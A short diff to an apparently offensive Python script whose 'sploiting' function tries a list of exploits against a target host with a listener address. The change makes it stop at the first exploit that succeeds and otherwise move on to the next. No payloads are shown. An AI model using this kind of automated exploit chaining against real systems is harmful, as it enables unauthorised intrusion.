@@ -72,8 +72,12 @@ def sploiting(list_of_sploit, host,lhost):
         product = sploit[0]
         exploit = sploit[2]
         print(f'Trying to exploit {product} with {exploit}...')
-        use_exploit(exploit,host,lhost)
-        print('Exploit done')
+        endcode = use_exploit(exploit,host,lhost)
+        if endcode == 0:
+            print('Exploit succeeded')
+            break
+        else:
+            print('Exploit failed, trying another one...')
 
 if __name__ == '__main__':
     if len(sys.argv) != 2:
